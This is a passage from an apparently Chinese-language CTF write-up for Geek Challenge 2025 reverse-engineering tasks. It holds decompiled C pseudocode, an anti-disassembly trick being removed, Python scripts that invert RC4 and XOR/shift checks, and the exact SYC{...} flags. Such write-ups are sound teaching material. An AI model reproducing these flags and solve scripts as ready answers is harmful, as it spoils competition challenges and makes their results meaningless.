</span></span><span class="line"><span class="cl">    <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0xF0</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x6E</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0xE5</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x6F</span><span class="p">,</span> <span class="mh">0x9F</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0xC9</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="mh">0xA6</span><span class="p">,</span> <span class="mh">0xBB</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x51</span>
</span></span><span class="line"><span class="cl"><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;geek2025&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">plaintext</span> <span class="o">=</span> <span class="n">rc4_decrypt</span><span class="p">(</span><span class="n">result</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;flag:&#34;</span><span class="p">,</span> <span class="n">plaintext</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-6">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{50_y0u_pl@y_Gensh1n_too}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="qyqsの奇妙冒险2">QYQSの奇妙冒险2
</h3><h4 id="解题流程-13">解题流程
</h4><p>这里直接打开看和之前那个奇妙冒险1差不多，算出来的结果也差不多，但事实并非如此
查看汇编代码
<img src="/p/geek-challenge-2025-wp/image-15.png"
	width="401"
	height="174"
	srcset="/p/geek-challenge-2025-wp/image-15_hu_3e5c430ccb18ce10.png 480w, /p/geek-challenge-2025-wp/image-15_hu_7ae1fe3f234c5bb5.png 1024w"
	loading="lazy"
	
		alt="alt text"
	
	
		class="gallery-image" 
		data-flex-grow="230"
		data-flex-basis="553px"
	
>
这里有段ucomiss，nop掉之后重新定义函数得到真正的伪代码
真正的伪代码:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span><span class="lnt">85
</span><span class="lnt">86
</span><span class="lnt">87
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kr">__int64</span> <span class="nf">Main</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// rdi
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rcx
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_BYTE</span> <span class="n">v3</span><span class="p">[</span><span class="mi">32</span><span class="p">];</span> <span class="c1">// [rsp+0h] [rbp-20h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp+0h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Input</span><span class="p">[</span><span class="mi">76</span><span class="p">];</span> <span class="c1">// [rsp+28h] [rbp+8h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">Key</span><span class="p">[</span><span class="mi">44</span><span class="p">];</span> <span class="c1">// [rsp+74h] [rbp+54h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="n">v7</span><span class="p">[</span><span class="mi">29</span><span class="p">];</span> <span class="c1">// [rsp+A0h] [rbp+80h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="n">v8</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+114h] [rbp+F4h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">_DWORD</span> <span class="n">Src</span><span class="p">[</span><span class="mi">8</span><span class="p">];</span> <span class="c1">// [rsp+134h] [rbp+114h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">v10</span><span class="p">;</span> <span class="c1">// [rsp+194h] [rbp+174h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">j</span><span class="p">;</span> <span class="c1">// [rsp+1B4h] [rbp+194h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">int</span> <span class="n">k</span><span class="p">;</span> <span class="c1">// [rsp+1D4h] [rbp+1B4h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">size_t</span> <span class="n">Input_len</span><span class="p">;</span> <span class="c1">// [rsp+2B8h] [rbp+298h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kr">__int64</span> <span class="n">v14</span><span class="p">;</span> <span class="c1">// [rsp+2C8h] [rbp+2A8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v0</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">128LL</span><span class="p">;</span> <span class="n">i</span><span class="p">;</span> <span class="o">--</span><span class="n">i</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="o">*</span><span class="p">(</span><span class="n">_DWORD</span> <span class="o">*</span><span class="p">)</span><span class="n">v0</span> <span class="o">=</span> <span class="o">-</span><span class="mi">858993460</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="n">v0</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_7FF7AECD13D9</span><span class="p">(</span><span class="n">byte_7FF7AECE50A6</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">strcpy</span><span class="p">(</span><span class="n">Key</span><span class="p">,</span> <span class="s">&#34;QYQS&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="mi">43</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="mi">28</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="mi">3</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="mi">57</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="mi">34</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="o">=</span> <span class="mi">41</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="o">=</span> <span class="mi">14</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="o">=</span> <span class="mi">11</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="o">=</span> <span class="mi">45</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">15</span><span class="p">]</span> <span class="o">=</span> <span class="mi">109</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">16</span><span class="p">]</span> <span class="o">=</span> <span class="mi">6</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">17</span><span class="p">]</span> <span class="o">=</span> <span class="mi">32</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">18</span><span class="p">]</span> <span class="o">=</span> <span class="mi">23</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">19</span><span class="p">]</span> <span class="o">=</span> <span class="mi">127</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">v7</span><span class="p">[</span><span class="mi">20</span><span class="p">]</span> <span class="o">=</span> <span class="mi">56</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">Src</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">2143289344</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="nf">j_memcpy</span><span class="p">(</span><span class="n">v8</span><span class="p">,</span> <span class="n">Src</span><span class="p">,</span> <span class="mi">4uLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_7FF7AECD1320</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_7FF7AECD1235</span><span class="p">(</span><span class="s">&#34;%s&#34;</span><span class="p">,</span> <span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">Input_len</span> <span class="o">=</span> <span class="nf">j_strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">Input_len</span> <span class="o">&gt;=</span> <span class="mh">0x32</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_7FF7AECD12EE</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="n">Input</span><span class="p">[</span><span class="n">Input_len</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="nf">j_strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">)</span> <span class="o">==</span> <span class="mi">21</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="n">v10</span> <span class="o">=</span> <span class="mi">114514</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">j</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">j</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span> <span class="o">=</span> <span class="n">j</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">j</span> <span class="o">&gt;=</span> <span class="nf">j_strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">+=</span> <span class="n">v7</span><span class="p">[</span><span class="n">j</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">v10</span> <span class="o">&lt;&lt;=</span> <span class="n">Key</span><span class="p">[</span><span class="n">j</span> <span class="o">%</span> <span class="mi">4</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">      <span class="n">Input</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^=</span> <span class="n">v10</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span> <span class="n">k</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">;</span> <span class="o">++</span><span class="n">k</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">      <span class="n">v14</span> <span class="o">=</span> <span class="n">k</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">k</span> <span class="o">&gt;=</span> <span class="nf">j_strlen</span><span class="p">(</span><span class="n">Input</span><span class="p">)</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">break</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="n">Input</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="o">!=</span> <span class="n">dword_7FF7AECDF000</span><span class="p">[</span><span class="n">k</span><span class="p">]</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">goto</span> <span class="n">LABEL_7</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_7FF7AECD1401</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_7FF7AECDC508</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_7FF7AECD11C7</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_7FF7AECD11C7</span><span class="p">(</span><span class="n">asc_7FF7AECDC518</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nf">getch</span><span class="p">();</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl"><span class="nl">LABEL_7</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nf">sub_7FF7AECD1401</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_7FF7AECDC4E8</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="nf">sub_7FF7AECD136B</span><span class="p">((</span><span class="kr">__int64</span><span class="p">)</span><span class="n">v3</span><span class="p">,</span> <span class="p">(</span><span class="kr">__int64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">unk_7FF7AECDC370</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>是给v10加上输入的每一位并左移,然后将输入的字符与v10异或，最后再与v7比较
直接逆了</p>
<h4 id="exp-15">exp
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">decrypt</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="n">encrypted</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x7b</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x45</span><span class="p">,</span> 
</span></span><span class="line"><span class="cl">                 <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="s2">&#34;QYQS&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="n">key_ascii</span> <span class="o">=</span> <span class="p">[</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">key</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">v7</span> <span class="o">=</span> <span class="p">[</span><span class="mi">2</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">16</span><span class="p">,</span> <span class="mi">43</span><span class="p">,</span> <span class="mi">28</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">57</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">34</span><span class="p">,</span> <span class="mi">41</span><span class="p">,</span> <span class="mi">14</span><span class="p">,</span> <span class="mi">11</span><span class="p">,</span> <span class="mi">45</span><span class="p">,</span> <span class="mi">109</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mi">32</span><span class="p">,</span> <span class="mi">23</span><span class="p">,</span> <span class="mi">127</span><span class="p">,</span> <span class="mi">56</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="n">v10</span> <span class="o">=</span> <span class="mi">114514</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">v10_values</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">21</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span> <span class="o">+=</span> <span class="n">v7</span><span class="p">[</span><span class="n">j</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10</span> <span class="o">&lt;&lt;=</span> <span class="n">key_ascii</span><span class="p">[</span><span class="n">j</span> <span class="o">%</span> <span class="mi">4</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">v10_values</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">v10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="n">decrypted</span> <span class="o">=</span> <span class="p">[]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">21</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypted_char</span> <span class="o">=</span> <span class="n">encrypted</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">^</span> <span class="p">(</span><span class="n">v10_values</span><span class="p">[</span><span class="n">j</span><span class="p">]</span> <span class="o">&amp;</span> <span class="mh">0xFF</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">decrypted</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">decrypted_char</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">    
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">decrypted</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="flag-7">flag
</h4><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">SYC{M@y_bE_y0u_F1nd?}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="ez_vm">ez_vm
</h3><h4 id="解题流程-14">解题流程
</h4><p>看不明白，靠猜</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="kr">__fastcall</span> <span class="nf">sub_9e8f7a</span><span class="p">(</span><span class="kr">__int64</span> <span class="n">a1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="kt">size_t</span> <span class="n">n</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-78h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">104</span><span class="p">];</span> <span class="c1">// [rsp+20h] [rbp-70h] BYREF
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="c1">// [rsp+88h] [rbp-8h]
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;Please enter the input string: &#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">fgets</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="mi">100</span><span class="p">,</span> <span class="n">stdin</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">s</span><span class="p">[</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">10</span> <span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">s</span><span class="p">[</span><span class="n">n</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">n</span> <span class="o">=</span> <span class="nf">strlen</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">768LL</span><span class="p">),</span> <span class="p">(</span><span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">256LL</span><span class="p">),</span> <span class="mh">0x1DuLL</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">memcpy</span><span class="p">((</span><span class="kt">void</span> <span class="o">*</span><span class="p">)(</span><span class="o">*</span><span class="p">(</span><span class="n">_QWORD</span> <span class="o">*</span><span class="p">)(</span><span class="n">a1</span> <span class="o">+</span> <span class="mi">96</span><span class="p">)</span> <span class="o">+</span> <span class="mi">512LL</span><span class="p">),</span> <span class="n">s</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_50AC</span> <span class="o">=</span> <span class="n">n</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_50CC</span> <span class="o">=</span> <span class="mi">768</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="n">dword_5134</span> <span class="o">=</span> <span class="mi">768</span><span class="p">;</span>
